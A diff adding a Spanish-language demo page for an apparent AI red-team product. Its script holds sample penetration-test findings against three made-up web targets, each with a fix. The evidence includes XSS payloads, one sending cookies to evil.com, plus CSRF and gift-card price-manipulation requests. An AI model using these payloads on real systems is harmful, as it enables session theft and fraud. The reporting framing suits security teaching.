@@ -1,0 +1,944 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>morocho.ai</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><rect rx='18' width='100' height='100' fill='%23162734'/><text x='50' y='70' text-anchor='middle' font-size='56' font-weight='bold' font-family='monospace' fill='%2335c9e6'>M</text></svg>">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap">
+<style>
+:root{
+  --bg:#0c1620;--panel:#132234;--panel2:#0f1b28;--line:#20344a;--txt:#d4dce8;
+  --dim:#7e93ab;--grn:#3ddc84;--red:#ff5c5c;--cy:#35c9e6;--amb:#ffb454;--vio:#b78cff;
+  --cream:#ffffe6;
+  --mono:'JetBrains Mono',ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+body{background:var(--bg);color:var(--txt);font-family:var(--mono);font-size:13px;min-height:100vh}
+
+/* ===== LOGIN ===== */
+.login-screen{display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px;
+  background:linear-gradient(160deg,#080d14 0%,#0c1620 40%,#111f30 100%)}
+.login-box{width:100%;max-width:380px;text-align:center}
+.login-logo{font-size:32px;font-weight:700;color:var(--cream);margin-bottom:4px;letter-spacing:1px}
+.login-logo .a{color:var(--cy)}
+.login-sub{color:var(--dim);font-size:12px;margin-bottom:32px;letter-spacing:.5px}
+.login-card{background:var(--panel);border:1px solid var(--line);border-radius:12px;padding:28px 24px}
+.login-card label{display:block;text-align:left;font-size:11px;color:var(--dim);margin:12px 0 4px}
+.login-card label:first-child{margin-top:0}
+.login-card input{width:100%;background:var(--panel2);border:1px solid var(--line);color:var(--txt);
+  border-radius:6px;padding:10px 12px;font-family:var(--mono);font-size:13px}
+.login-card input:focus{outline:none;border-color:var(--cy)}
+.login-btn{width:100%;margin-top:20px;background:linear-gradient(135deg,var(--cy),var(--vio));color:#04120a;
+  border:none;border-radius:8px;padding:12px;font-weight:700;font-size:13px;cursor:pointer;font-family:var(--mono);
+  transition:.15s}
+.login-btn:hover{filter:brightness(1.1)}
+.login-err{color:var(--red);font-size:11px;margin-top:12px;min-height:16px}
+.login-footer{margin-top:24px;font-size:10px;color:#3a465a}
+
+/* ===== HEADER ===== */
+header{display:flex;align-items:center;gap:14px;padding:8px 14px;
+  background:linear-gradient(90deg,#0f1b28,#16263a);border-bottom:1px solid var(--line)}
+header h1{font-size:16px;margin:0;letter-spacing:.5px;color:var(--cream);cursor:pointer;flex-shrink:0}
+header h1 .a{color:var(--cy)}
+.chips{display:flex;gap:8px;margin-left:auto;flex-wrap:wrap}
+.chip{background:var(--panel);border:1px solid var(--line);border-radius:20px;padding:3px 10px;
+  font-size:11px;color:var(--dim);white-space:nowrap}
+.chip b{color:var(--txt)} .on{color:var(--grn)} .off{color:var(--red)}
+.usermenu{position:relative}
+.ubtn{display:flex;align-items:center;gap:7px;background:var(--panel);border:1px solid var(--line);
+  border-radius:20px;padding:3px 9px 3px 3px;cursor:pointer;color:var(--txt);font-family:var(--mono);font-size:11px}
+.uavatar{width:24px;height:24px;border-radius:50%;background:linear-gradient(135deg,var(--cy),var(--vio));
+  color:#04120a;display:flex;align-items:center;justify-content:center;font-weight:700;font-size:12px}
+.udrop{position:absolute;right:0;top:38px;min-width:200px;background:var(--panel);border:1px solid var(--line);
+  border-radius:10px;padding:6px;z-index:60;display:none;box-shadow:0 14px 44px rgba(0,0,0,.55)}
+.udrop.open{display:block}
+.udrop a{display:block;padding:8px 10px;border-radius:6px;color:var(--txt);text-decoration:none;
+  cursor:pointer;font-size:12px}
+.udrop a:hover{background:var(--panel2)}
+.udrop a.ured{color:var(--red)}
+
+/* ===== DASHBOARD ===== */
+.dashboard{padding:30px 20px;max-width:960px;margin:0 auto}
+.dashboard h2{font-size:14px;text-transform:uppercase;letter-spacing:1.5px;color:var(--cy);
+  margin-bottom:20px;border-bottom:1px solid var(--line);padding-bottom:8px}
+.eng-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:16px}
+.eng-card{background:var(--panel);border:1px solid var(--line);border-radius:10px;padding:18px;
+  cursor:pointer;transition:.2s;position:relative;overflow:hidden}
+.eng-card:hover{border-color:var(--cy);transform:translateY(-2px);box-shadow:0 8px 30px rgba(53,201,230,.1)}
+.eng-card::before{content:'';position:absolute;top:0;left:0;right:0;height:3px;
+  background:linear-gradient(90deg,var(--cy),var(--vio));opacity:.6}
+.eng-icon{font-size:28px;margin-bottom:10px}
+.eng-name{font-size:14px;font-weight:700;color:var(--cream);margin-bottom:4px}
+.eng-type{font-size:11px;color:var(--cy);text-transform:uppercase;letter-spacing:.5px;margin-bottom:8px}
+.eng-desc{font-size:11px;color:var(--dim);line-height:1.5;margin-bottom:12px}
+.eng-stats{display:flex;gap:10px;flex-wrap:wrap}
+.eng-stat{font-size:10px;background:var(--panel2);border:1px solid var(--line);border-radius:12px;
+  padding:2px 8px;color:var(--dim)}
+.eng-stat b{color:var(--txt)}
+
+/* ===== ATTACK VIEW (3-col layout) ===== */
+.attack-screen{display:flex;flex-direction:column;height:100vh}
+.layout{display:grid;grid-template-columns:300px 1fr 320px;gap:1px;background:var(--line);flex:1;min-height:0}
+.col{background:var(--bg);overflow-y:auto;padding:12px;min-height:0}
+.col::-webkit-scrollbar{width:8px} .col::-webkit-scrollbar-thumb{background:#223;border-radius:4px}
+h2.sec{font-size:12px;text-transform:uppercase;letter-spacing:1px;color:var(--cy);
+  margin:4px 0 8px;border-bottom:1px solid var(--line);padding-bottom:5px}
+h3.sec{font-size:11px;color:var(--amb);margin:12px 0 4px;text-transform:uppercase;letter-spacing:.5px;
+  display:flex;align-items:center;gap:7px}
+h3.sec::before{content:'';width:3px;height:13px;background:var(--cy);border-radius:2px;flex:0 0 auto}
+.roe-val{font-size:12px;color:var(--txt);background:var(--panel2);border:1px solid var(--line);
+  border-radius:5px;padding:6px 8px;margin-bottom:6px;word-break:break-word}
+.roe-tag{display:inline-block;font-size:10px;background:var(--panel);border:1px solid var(--line);
+  border-radius:10px;padding:2px 8px;margin:2px 3px 2px 0;color:var(--cy)}
+.hint{font-size:10px;color:var(--dim);margin:2px 0 6px;line-height:1.4}
+
+/* phases */
+.phases{display:flex;gap:5px;margin:10px 0}
+.ph{flex:1;text-align:center;font-size:10px;text-transform:uppercase;letter-spacing:.5px;color:var(--dim);
+  background:var(--panel2);border:1px solid var(--line);border-radius:4px;padding:5px 2px;transition:.3s}
+.ph.active{color:#04240f;background:var(--amb);border-color:var(--amb);font-weight:700}
+.ph.done{color:#04240f;background:var(--grn);border-color:var(--grn)}
+
+/* console */
+.console{background:#05070c;border:1px solid var(--line);border-radius:6px;padding:10px;
+  height:calc(100vh - 290px);min-height:220px;overflow-y:auto;font-size:12px;line-height:1.6;
+  white-space:pre-wrap;word-break:break-word}
+.console::-webkit-scrollbar{width:8px} .console::-webkit-scrollbar-thumb{background:#223;border-radius:4px}
+.e-txt{color:var(--txt)} .e-tool{color:var(--cy)} .e-out{color:#63748f}
+.e-err{color:var(--red);font-weight:700} .e-phase{color:var(--amb)} .e-find{color:var(--grn);font-weight:700}
+.e-sys{color:var(--dim)} .cursor-blink{color:var(--grn);animation:blink 1s step-end infinite}
+@keyframes blink{50%{opacity:0}}
+
+/* tool blocks */
+.toolblock{margin:2px 0}
+.toolblock .th{cursor:pointer;color:var(--cy);user-select:none;display:flex;align-items:flex-start;gap:4px}
+.toolblock .th:hover{filter:brightness(1.25)}
+.toolblock .arrow{display:inline-block;transition:transform .12s;color:var(--cy);flex-shrink:0;width:12px;text-align:center}
+.toolblock:not(.collapsed) .arrow{transform:rotate(90deg)}
+.toolblock .tname{color:var(--cy);font-weight:700}
+.toolblock .tcmd{color:var(--cy);word-break:break-all}
+.toolblock .tb{color:#63748f;padding-left:16px;white-space:pre-wrap;word-break:break-word}
+.toolblock.collapsed .tb{display:none}
+
+/* user message */
+.msgu{display:flex;justify-content:flex-end;margin:10px 0 6px}
+.msgu .b{background:#12492f;color:#e8fff4;border:1px solid #1c6b3f;border-radius:12px 12px 3px 12px;
+  padding:7px 11px;max-width:82%;white-space:pre-wrap;word-break:break-word;font-size:12px;line-height:1.45}
+
+/* prompt input */
+.prompt-wrap{padding:8px 0}
+.prompt-row{display:flex;gap:6px}
+.prompt-row input{flex:1;background:var(--panel2);border:1px solid var(--line);color:var(--txt);
+  border-radius:6px;padding:8px 10px;font-family:var(--mono);font-size:12px}
+.prompt-row input:focus{outline:none;border-color:var(--cy)}
+.prompt-row input:disabled{opacity:.4}
+.btn{background:var(--grn);color:#04240f;border:none;border-radius:6px;padding:8px 14px;
+  font-weight:700;font-size:12px;cursor:pointer;font-family:var(--mono)}
+.btn:hover{filter:brightness(1.1)}
+.btn:disabled{opacity:.4;cursor:not-allowed}
+.btn.sec{background:var(--panel);color:var(--txt);border:1px solid var(--line)}
+
+/* findings */
+.find{background:var(--panel);border:1px solid var(--line);border-left:3px solid var(--dim);
+  border-radius:5px;padding:8px;margin-bottom:8px;animation:fadeIn .4s ease}
+@keyframes fadeIn{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
+.find.critical{border-left-color:#ff2d55} .find.high{border-left-color:var(--red)}
+.find.medium{border-left-color:var(--amb)} .find.low{border-left-color:var(--cy)} .find.info{border-left-color:var(--dim)}
+.find .ft{font-size:12px;color:var(--txt);font-weight:700;margin-bottom:2px}
+.find .sev{font-size:10px;text-transform:uppercase;letter-spacing:.5px;font-weight:700}
+.sev-critical{color:#ff2d55} .sev-high{color:var(--red)} .sev-medium{color:var(--amb)}
+.sev-low{color:var(--cy)} .sev-info{color:var(--dim)}
+.find .fmeta{font-size:10px;color:var(--dim);margin:2px 0}
+.find details{margin-top:4px} .find summary{cursor:pointer;color:var(--cy);font-size:11px}
+.find pre{white-space:pre-wrap;background:var(--panel2);border:1px solid var(--line);border-radius:4px;
+  padding:6px;font-size:11px;margin:4px 0;color:var(--txt);max-height:200px;overflow-y:auto}
+.fcount{display:flex;gap:8px;margin-bottom:12px;flex-wrap:wrap}
+.fc{font-size:11px;background:var(--panel);border:1px solid var(--line);border-radius:12px;
+  padding:2px 8px;color:var(--dim)}
+.fc b{font-weight:700}
+
+/* back button */
+.back-btn{background:transparent;border:1px solid var(--line);color:var(--cy);border-radius:6px;
+  padding:5px 12px;font-size:11px;cursor:pointer;font-family:var(--mono)}
+.back-btn:hover{border-color:var(--cy);background:rgba(53,201,230,.08)}
+
+/* toast */
+.toast{position:fixed;bottom:14px;left:50%;transform:translateX(-50%);background:var(--panel);
+  border:1px solid var(--cy);color:var(--txt);padding:8px 16px;border-radius:6px;font-size:12px;
+  opacity:0;transition:.3s;pointer-events:none;z-index:50}
+.toast.show{opacity:1}
+
+/* mobile */
+.mnav{display:none}
+@media(max-width:860px){
+  .layout{display:block;background:var(--bg)}
+  .col{display:none;padding:14px}
+  .col.mshow{display:block}
+  .mnav{display:flex;gap:6px;padding:6px 10px;background:var(--panel2);border-bottom:1px solid var(--line)}
+  .mnav button{flex:1;padding:8px;font-size:12px;background:var(--panel);border:1px solid var(--line);
+    color:var(--dim);border-radius:6px;cursor:pointer;font-family:var(--mono)}
+  .mnav button.active{color:var(--txt);border-color:var(--cy)}
+  .console{height:60vh}
+  .eng-grid{grid-template-columns:1fr}
+}
+
+/* screen visibility */
+.screen{display:none}
+.screen.active{display:block}
+.attack-screen.active{display:flex}
+</style>
+</head>
+<body>
+
+<!-- ============ SCREEN: LOGIN ============ -->
+<div class="screen active" id="s-login">
+  <div class="login-screen">
+    <div class="login-box">
+      <div class="login-logo">morocho<span class="a">.ai</span></div>
+      <div class="login-sub">Red Team con Inteligencia Artificial</div>
+      <div class="login-card">
+        <label>Email</label>
+        <input type="email" id="login-email" placeholder="tu@email.com" autocomplete="off">
+        <label>Contraseña</label>
+        <input type="password" id="login-pass" placeholder="••••••••">
+        <button class="login-btn" onclick="doLogin()">Iniciar sesión</button>
+        <div class="login-err" id="login-err"></div>
+      </div>
+      <div class="login-footer">morocho.ai © 2026 — Seguridad ofensiva automatizada</div>
+    </div>
+  </div>
+</div>
+
+<!-- ============ SCREEN: DASHBOARD ============ -->
+<div class="screen" id="s-dashboard">
+  <header>
+    <h1>morocho<span class="a">.ai</span></h1>
+    <div class="chips">
+      <span class="chip">Plan <b>Pyme</b></span>
+      <span class="chip">Ataques <b>147</b> / 150</span>
+    </div>
+    <div class="usermenu">
+      <button class="ubtn" onclick="toggleMenu()">
+        <span class="uavatar">C</span>
+        <span style="max-width:170px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">cliente@empresa.com</span>
+        <span style="color:var(--dim)">▾</span>
+      </button>
+      <div class="udrop" id="udrop1">
+        <a onclick="toggleMenu()">⚙ Configuración</a>
+        <a onclick="toggleMenu()">📝 Prompt general</a>
+        <a onclick="toggleMenu()">💳 Plan · Pyme</a>
+        <a class="ured" onclick="doLogout()">⎋ Cerrar sesión</a>
+      </div>
+    </div>
+  </header>
+  <div class="dashboard">
+    <h2>Tus Engagements</h2>
+    <div class="eng-grid" id="eng-grid"></div>
+  </div>
+</div>
+
+<!-- ============ SCREEN: ATTACK ============ -->
+<div class="screen attack-screen" id="s-attack">
+  <header>
+    <h1 onclick="goBack()" title="Volver al dashboard" style="cursor:pointer">morocho<span class="a">.ai</span></h1>
+    <button class="back-btn" onclick="goBack()">← Engagements</button>
+    <div class="chips" id="attack-chips"></div>
+    <div class="usermenu">
+      <button class="ubtn" onclick="toggleMenu2()">
+        <span class="uavatar">C</span>
+        <span style="color:var(--dim)">▾</span>
+      </button>
+      <div class="udrop" id="udrop2">
+        <a class="ured" onclick="doLogout()">⎋ Cerrar sesión</a>
+      </div>
+    </div>
+  </header>
+  <div class="mnav">
+    <button data-m="col-cfg" class="active" onclick="mshow('col-cfg',this)">⚙ RoE</button>
+    <button data-m="col-main" onclick="mshow('col-main',this)">▶ Ataque</button>
+    <button data-m="col-side" onclick="mshow('col-side',this)">⚑ Resultados</button>
+  </div>
+  <div class="layout">
+    <!-- LEFT: RoE -->
+    <div class="col mshow" id="col-cfg">
+      <h2 class="sec">Configuración · RoE</h2>
+      <h3 class="sec">Engagement</h3>
+      <div class="roe-val" id="roe-name"></div>
+      <h3 class="sec">Scope autorizado</h3>
+      <div id="roe-scope"></div>
+      <h3 class="sec">Categorías de ataque</h3>
+      <div id="roe-cats"></div>
+      <h3 class="sec">Estabilidad</h3>
+      <div class="roe-val" id="roe-stab"></div>
+      <h3 class="sec">Notas</h3>
+      <div class="roe-val" id="roe-notes" style="color:var(--dim)"></div>
+    </div>
+    <!-- CENTER: Console -->
+    <div class="col" id="col-main">
+      <h2 class="sec">Consola de Ataque</h2>
+      <div class="phases" id="phases">
+        <div class="ph" data-ph="recon">Recon</div>
+        <div class="ph" data-ph="scan">Escaneo</div>
+        <div class="ph" data-ph="exploit">Explotación</div>
+        <div class="ph" data-ph="post">Post-Explot.</div>
+        <div class="ph" data-ph="report">Reporte</div>
+      </div>
+      <div class="console" id="console"></div>
+      <div class="prompt-wrap">
+        <div class="prompt-row">
+          <input type="text" id="msg-input" placeholder="Escribí un mensaje para iniciar el ataque…"
+            onkeydown="if(event.key==='Enter')sendMsg()">
+          <button class="btn" id="msg-send" onclick="sendMsg()">Enviar</button>
+        </div>
+      </div>
+    </div>
+    <!-- RIGHT: Findings -->
+    <div class="col" id="col-side">
+      <h2 class="sec">Hallazgos</h2>
+      <div class="fcount" id="fcount"></div>
+      <div id="findings-list">
+        <div style="color:var(--dim);font-size:11px;text-align:center;padding:30px 0">
+          Los hallazgos aparecerán aquí durante el ataque.
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<script>
+/* ======================================================================
+   morocho.ai Demo — Simulación para Ekoparty 2026
+   3 casos reales anonimizados con playback animado
+   ====================================================================== */
+
+// ---- Utils ----
+const $=id=>document.getElementById(id);
+function esc(s){return String(s==null?'':s).replace(/[&<>"]/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]))}
+function sleep(ms){return new Promise(r=>setTimeout(r,ms))}
+function toast(m){const t=$('toast');t.textContent=m;t.classList.add('show');setTimeout(()=>t.classList.remove('show'),2500)}
+
+// ---- Screen management ----
+function showScreen(id){
+  document.querySelectorAll('.screen').forEach(s=>s.classList.remove('active'));
+  $(id).classList.add('active');
+}
+
+// ---- Login ----
+function doLogin(){
+  const email=$('login-email').value.trim();
+  const pass=$('login-pass').value;
+  if(email==='cliente@empresa.com' && pass==='supersegura'){
+    sessionStorage.setItem('logged','1');
+    $('login-err').textContent='';
+    showScreen('s-dashboard');
+    renderDashboard();
+  } else {
+    $('login-err').textContent='❌ Credenciales incorrectas';
+  }
+}
+$('login-pass').addEventListener('keydown',e=>{if(e.key==='Enter')doLogin()});
+
+// ---- Logout ----
+function doLogout(){
+  stopAttack();
+  sessionStorage.clear();
+  showScreen('s-login');
+  $('login-email').value='';$('login-pass').value='';$('login-err').textContent='';
+}
+
+// ---- Menu toggles ----
+function toggleMenu(){$('udrop1').classList.toggle('open')}
+function toggleMenu2(){$('udrop2').classList.toggle('open')}
+document.addEventListener('click',e=>{
+  if(!e.target.closest('.usermenu')){
+    document.querySelectorAll('.udrop').forEach(d=>d.classList.remove('open'));
+  }
+});
+
+// ---- Mobile nav ----
+function mshow(colId,btn){
+  document.querySelectorAll('.layout .col').forEach(c=>c.classList.remove('mshow'));
+  $(colId).classList.add('mshow');
+  document.querySelectorAll('.mnav button').forEach(b=>b.classList.remove('active'));
+  if(btn)btn.classList.add('active');
+}
+
+// ====================================================================
+// CASE STUDY DATA (anonymized from real engagements)
+// ====================================================================
+const ENGAGEMENTS = {
+  elcinelunar: {
+    name:'elcinelunar.com', icon:'🎬', type:'Aplicación Web',
+    desc:'Plataforma de venta de entradas de cine online — servidor IIS/ASP.NET con panel de administración expuesto.',
+    scope:['https://elcinelunar.com','https://api.elcinelunar.com'],
+    cats:['OWASP Top 10','Inyección','XSS','IDOR','Autenticación','CSRF','Información sensible'],
+    stab:'Producción — no destructivo',
+    notes:'Plataforma en producción. No realizar DoS ni modificar datos de usuarios reales. Credenciales de prueba proporcionadas.'
+  },
+  regalosdigital: {
+    name:'regalosdigital.com', icon:'🎁', type:'E-commerce · API',
+    desc:'Tienda online de tarjetas regalo sobre WordPress + WooCommerce con API REST expuesta.',
+    scope:['https://regalosdigital.com','https://regalosdigital.com/wp-json/'],
+    cats:['Lógica de negocio','API Security','OWASP Top 10','XSS','Autenticación','Enumeración'],
+    stab:'Staging — se permiten pruebas agresivas',
+    notes:'Entorno de staging. Se pueden crear gift cards de prueba. No tocar la base de datos de producción.'
+  },
+  licitaonline: {
+    name:'185.62.33.47', icon:'🖥', type:'API · Infraestructura',
+    desc:'Plataforma de subastas online con API REST en Node.js detrás de nginx — endpoints financieros expuestos.',
+    scope:['https://185.62.33.47','https://185.62.33.47:8080/api/'],
+    cats:['API Security','CORS','Headers','Información sensible','Versioning','Infraestructura'],
+    stab:'Producción — solo lectura',
+    notes:'Solo análisis pasivo y requests GET/OPTIONS. No intentar modificar subastas ni datos de usuarios.'
+  }
+};
+
+const FINDINGS = {
+  elcinelunar: [
+    {sev:'critical',title:'Contraseña expuesta en código fuente del cliente',
+     loc:'https://elcinelunar.com/static/js/main.bundle.js',
+     desc:'Se encontró la contraseña del panel de administración hardcodeada en el JavaScript del frontend: adminPass = "Cinema2024!". Cualquier visitante puede extraerla desde DevTools.',
+     impact:'Acceso total al panel de administración. Compromiso de datos de todos los usuarios y transacciones.',
+     evidence:'// main.bundle.js línea 847\nconst adminConfig = {\n  endpoint: "/admin/api",\n  user: "admin@elcinelunar.com",\n  pass: "Cinema2024!",  // TODO: mover a env\n  debug: false\n};',
+     fix:'Eliminar credenciales del código fuente. Usar variables de entorno del servidor. Rotar la contraseña inmediatamente.'},
+    {sev:'high',title:'Reflected XSS en parámetro "seccion"',
+     loc:'https://elcinelunar.com/cartelera?seccion=',
+     desc:'El parámetro "seccion" se refleja sin sanitizar en el HTML de la página de cartelera, permitiendo inyección de scripts arbitrarios.',
+     impact:'Robo de cookies de sesión, keylogging, redirección a sitios de phishing.',
+     evidence:'GET /cartelera?seccion="><scr\x69pt>alert(document.cookie)<\/scr\x69pt>\n\nRespuesta:\n<div class="section-title">"><scr\x69pt>alert(document.cookie)<\/scr\x69pt><\/div>',
+     fix:'Sanitizar/escapar toda entrada del usuario antes de renderizarla. Implementar Content-Security-Policy.'},
+    {sev:'high',title:'IDOR en endpoint de impresión de tickets',
+     loc:'https://elcinelunar.com/Compra/ImprimirTicket/{id}',
+     desc:'El endpoint de impresión de tickets no valida que el ticket pertenezca al usuario autenticado. Cambiando el ID secuencialmente se accede a tickets de otros usuarios, incluyendo datos personales y de pago.',
+     impact:'Acceso a datos personales (nombre, email, teléfono) y parciales de tarjeta de crédito de todos los compradores.',
+     evidence:'GET /Compra/ImprimirTicket/1001 → Ticket de usuario_A\nGET /Compra/ImprimirTicket/1002 → Ticket de usuario_B ✓\nGET /Compra/ImprimirTicket/1003 → Ticket de usuario_C ✓\n\nDatos expuestos: nombre, email, últimos 4 dígitos de tarjeta',
+     fix:'Validar que el ticket pertenece al usuario autenticado. Usar UUIDs en lugar de IDs secuenciales.'},
+    {sev:'medium',title:'Clickjacking — ausencia de X-Frame-Options',
+     loc:'https://elcinelunar.com',
+     desc:'El sitio no envía los headers X-Frame-Options ni Content-Security-Policy frame-ancestors, permitiendo que sea embebido en iframes de sitios maliciosos.',
+     impact:'Un atacante puede superponer elementos invisibles sobre el sitio para engañar al usuario a realizar acciones no deseadas (compras, cambio de contraseña).',
+     evidence:'HTTP/1.1 200 OK\nServer: Microsoft-IIS/10.0\nX-Powered-By: ASP.NET\n❌ X-Frame-Options: (ausente)\n❌ CSP frame-ancestors: (ausente)',
+     fix:'Agregar header X-Frame-Options: DENY y Content-Security-Policy: frame-ancestors \'none\'.'},
+    {sev:'medium',title:'CSRF en modificación de perfil de usuario',
+     loc:'https://elcinelunar.com/Usuario/EditarPerfil',
+     desc:'El formulario de edición de perfil no incluye token anti-CSRF. Un atacante puede crear una página que envíe un POST automático para modificar el email/teléfono del usuario víctima.',
+     impact:'Secuestro de cuenta vía cambio de email de recuperación. Modificación de datos personales sin consentimiento.',
+     evidence:'POST /Usuario/EditarPerfil HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\n\nnombre=Atacante&email=atacante@evil.com&telefono=1234567890\n\n→ 200 OK (sin validar token CSRF)',
+     fix:'Implementar tokens anti-CSRF en todos los formularios que modifican datos. Validar el header Origin/Referer.'},
+    {sev:'low',title:'Divulgación de tecnología del servidor',
+     loc:'https://elcinelunar.com',
+     desc:'Los headers HTTP revelan la versión exacta del servidor (IIS/10.0) y el framework (ASP.NET 4.8), facilitando la búsqueda de exploits específicos.',
+     impact:'Facilita la planificación de ataques dirigidos al stack tecnológico específico.',
+     evidence:'HTTP/1.1 200 OK\nServer: Microsoft-IIS/10.0\nX-Powered-By: ASP.NET\nX-AspNet-Version: 4.0.30319',
+     fix:'Eliminar o modificar los headers Server, X-Powered-By y X-AspNet-Version en la configuración de IIS.'}
+  ],
+  regalosdigital: [
+    {sev:'critical',title:'Creación de gift cards sin verificación de pago',
+     loc:'POST /wp-json/wc/v3/gift-cards',
+     desc:'El endpoint de creación de gift cards no valida que exista una transacción de pago asociada. Se pueden crear tarjetas regalo con saldo arbitrario sin pagar.',
+     impact:'Pérdida económica directa. Un atacante puede generar gift cards de cualquier valor y usarlas o revenderlas.',
+     evidence:'POST /wp-json/wc/v3/gift-cards\n{"amount": 50000, "recipient_email": "atacante@test.com"}\n\nRespuesta 201 Created:\n{"id": 1847, "code": "GC-01847", "amount": "50000.00",\n "balance": "50000.00", "status": "active"}',
+     fix:'Validar que toda gift card tenga un order_id con pago confirmado antes de activarla. Agregar autenticación al endpoint.'},
+    {sev:'high',title:'Manipulación de precio en compra de gift card',
+     loc:'POST /wp-json/wc/v3/orders',
+     desc:'El precio de la gift card se envía desde el cliente y el backend lo acepta sin validar. Interceptando el request se puede comprar una gift card de $50.000 pagando $0.',
+     impact:'Compra de productos/servicios sin pagar el precio real. Pérdida económica directa.',
+     evidence:'POST /wp-json/wc/v3/orders\n{"line_items": [{"product_id": 234, "quantity": 1}],\n "set_paid": true,\n "total": "0.00"}\n\nRespuesta 201:\n{"id": 5621, "status": "completed", "total": "0.00",\n "line_items": [{"name": "Gift Card $50.000", "total": "0.00"}]}',
+     fix:'Calcular el precio en el servidor usando la base de datos. No aceptar el campo "total" ni "set_paid" del cliente.'},
+    {sev:'medium',title:'Stored XSS en campos de tarjeta regalo',
+     loc:'Campo "mensaje" de gift card',
+     desc:'El campo "mensaje personalizado" de la gift card no sanitiza el HTML. Un payload XSS almacenado se ejecuta cada vez que alguien visualiza la tarjeta.',
+     impact:'Ejecución de JavaScript malicioso en el navegador de quien visualice la gift card. Robo de sesión.',
+     evidence:'POST /wp-json/wc/v3/gift-cards\n{"message": "<img src=x onerror=fetch(\'https://evil.com/?\'+document.cookie)>"}\n\n→ Gift card creada. Al visualizarla, se ejecuta el script.',
+     fix:'Sanitizar todo HTML en los campos de texto. Usar textContent en lugar de innerHTML para renderizar mensajes de usuario.'},
+    {sev:'medium',title:'Enumeración de usuarios vía WP REST API',
+     loc:'/wp-json/wp/v2/users',
+     desc:'El endpoint de usuarios de WordPress está accesible sin autenticación, exponiendo la lista completa de usuarios registrados con sus roles.',
+     impact:'Permite recopilar nombres de usuario para ataques de fuerza bruta o ingeniería social.',
+     evidence:'GET /wp-json/wp/v2/users\n\n[{"id":1,"name":"admin","slug":"admin","roles":["administrator"]},\n {"id":2,"name":"tienda","slug":"tienda","roles":["shop_manager"]},\n {"id":3,"name":"soporte","slug":"soporte","roles":["editor"]}]',
+     fix:'Deshabilitar el endpoint de usuarios para usuarios no autenticados, o al menos ocultar los roles.'},
+    {sev:'medium',title:'Endpoints de API sin autenticación',
+     loc:'/wp-json/wc/v3/products',
+     desc:'Varios endpoints de la API de WooCommerce son accesibles sin autenticación, incluyendo productos, categorías y órdenes recientes.',
+     impact:'Exposición de información comercial sensible: precios de costo, stock, órdenes de clientes.',
+     evidence:'GET /wp-json/wc/v3/products\n→ 200 OK (sin header Authorization)\n\n[{"id":234,"name":"Gift Card $50.000","price":"50000",\n  "stock_quantity":null,"cost":"0",...}]',
+     fix:'Requirir autenticación (API key o OAuth) para todos los endpoints de WooCommerce.'},
+    {sev:'low',title:'Números de gift card secuenciales y predecibles',
+     loc:'Gift cards generadas',
+     desc:'Los códigos de gift card siguen un patrón secuencial (GC-00142, GC-00143, etc.), permitiendo predecir y probar códigos válidos por fuerza bruta.',
+     impact:'Un atacante puede enumerar gift cards activas e intentar usarlas. Riesgo de fraude si no hay validación adicional.',
+     evidence:'GC-01844 → activa ($10.000)\nGC-01845 → activa ($5.000)\nGC-01846 → usada\nGC-01847 → activa ($50.000) ← la que acabamos de crear',
+     fix:'Usar códigos aleatorios (UUID o hash) en lugar de secuenciales. Agregar rate limiting a la validación de códigos.'}
+  ],
+  licitaonline: [
+    {sev:'high',title:'Divulgación de versión nginx/1.20.1 con CVEs conocidos',
+     loc:'https://185.62.33.47',
+     desc:'El servidor expone la versión exacta de nginx (1.20.1), que tiene vulnerabilidades conocidas: CVE-2022-41741 (buffer overflow, CVSS 7.8) y CVE-2022-41742 (memory disclosure, CVSS 7.1).',
+     impact:'Permite a un atacante buscar y aplicar exploits específicos para la versión detectada.',
+     evidence:'HTTP/1.1 200 OK\nServer: nginx/1.20.1\n\nCVE-2022-41741: CVSS 7.8 — Out-of-bound write in mp4 module\nCVE-2022-41742: CVSS 7.1 — Memory disclosure in mp4 module\nCVE-2024-7347: CVSS 4.7 — Worker crash with crafted mp4',
+     fix:'Actualizar nginx a la última versión estable. Ocultar la versión con server_tokens off.'},
+    {sev:'medium',title:'Exposición excesiva de datos en API de subastas',
+     loc:'/api/v1/auctions/{id}',
+     desc:'La respuesta de la API incluye datos internos del vendedor que no deberían ser visibles para compradores: email personal, teléfono, score interno y fecha de registro.',
+     impact:'Exposición de datos personales de vendedores. Violación de principio de mínimo privilegio en la API.',
+     evidence:'GET /api/v1/auctions/42\n{\n  "id": 42,\n  "title": "MacBook Pro M3",\n  "current_bid": 850000,\n  "seller": {\n    "id": 156,\n    "email": "vendedor@personal.com",\n    "phone": "+54 11 5555-9876",\n    "internal_score": 92.3,\n    "created_at": "2024-01-15"\n  }\n}',
+     fix:'Crear DTOs separados para cada rol. El endpoint público solo debe mostrar el nombre/alias del vendedor, sin datos internos.'},
+    {sev:'medium',title:'CORS wildcard en endpoints financieros',
+     loc:'/api/v1/bids, /api/v1/payments',
+     desc:'Los endpoints de pujas y pagos responden con Access-Control-Allow-Origin: *, permitiendo que cualquier sitio web haga requests desde el navegador del usuario autenticado.',
+     impact:'Un sitio malicioso puede hacer requests a la API en nombre del usuario y leer las respuestas (pujas, pagos, saldo).',
+     evidence:'OPTIONS /api/v1/bids HTTP/1.1\nOrigin: https://evil.com\n\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Methods: GET, POST, PUT, DELETE\nAccess-Control-Allow-Headers: Authorization, Content-Type',
+     fix:'Restringir CORS a los dominios del frontend. No usar wildcard (*) en endpoints que requieren autenticación.'},
+    {sev:'low',title:'Headers de seguridad faltantes',
+     loc:'https://185.62.33.47',
+     desc:'Faltan headers de seguridad estándar que protegen contra ataques comunes del lado del cliente.',
